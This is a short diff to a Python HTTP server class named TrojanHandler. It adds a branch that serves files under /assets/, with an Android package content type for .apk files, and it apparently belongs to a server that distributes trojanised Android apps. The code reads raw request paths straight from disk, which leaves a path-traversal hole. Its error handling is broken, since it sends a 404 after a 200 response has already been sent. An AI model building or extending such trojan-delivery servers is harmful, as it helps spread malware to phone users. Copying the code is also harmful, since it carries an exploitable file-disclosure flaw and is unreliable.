@@ -42,6 +42,22 @@ class TrojanHandler(http.server.BaseHTTPRequestHandler):
             self.end_headers()
             with open(self.path[1:], "rb") as f:
                 self.wfile.write(f.read())
+        elif self.path.startswith("/assets/"):
+            # Serve APK and other assets
+            self.send_response(200)
+            if self.path.endswith(".apk"):
+                self.send_header("Content-type", "application/vnd.android.package-archive")
+            elif self.path.endswith(".png") or self.path.endswith(".jpg") or self.path.endswith(".gif"):
+                self.send_header("Content-type", "image/png")
+            else:
+                self.send_header("Content-type", "application/octet-stream")
+            self.end_headers()
+            try:
+                with open(self.path[1:], "rb") as f:
+                    self.wfile.write(f.read())
+            except FileNotFoundError:
+                self.send_response(404)
+                self.end_headers()
         else:
             self.send_response(404)
             self.end_headers()
